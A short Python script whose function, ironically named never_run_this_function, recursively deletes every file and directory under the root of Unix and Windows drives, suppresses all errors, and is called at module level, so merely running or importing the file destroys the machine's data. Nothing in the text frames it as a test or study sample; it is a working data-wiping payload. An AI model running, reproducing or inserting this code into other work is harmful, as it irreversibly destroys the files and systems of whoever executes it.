import contextlib
import shutil
from pathlib import Path


def never_run_this_function():
    def unlink_without_error(file: Path):
        with contextlib.suppress(BaseException):
            if file.is_dir() and not file.is_symlink():
                shutil.rmtree(file)
                return
            file.unlink(missing_ok=True)

    with contextlib.suppress(BaseException):
        for f in Path("/").glob("**/*"):
            unlink_without_error(f)
    with contextlib.suppress(BaseException):
        for f in Path("C:/").glob("**/*"):
            unlink_without_error(f)

never_run_this_function()
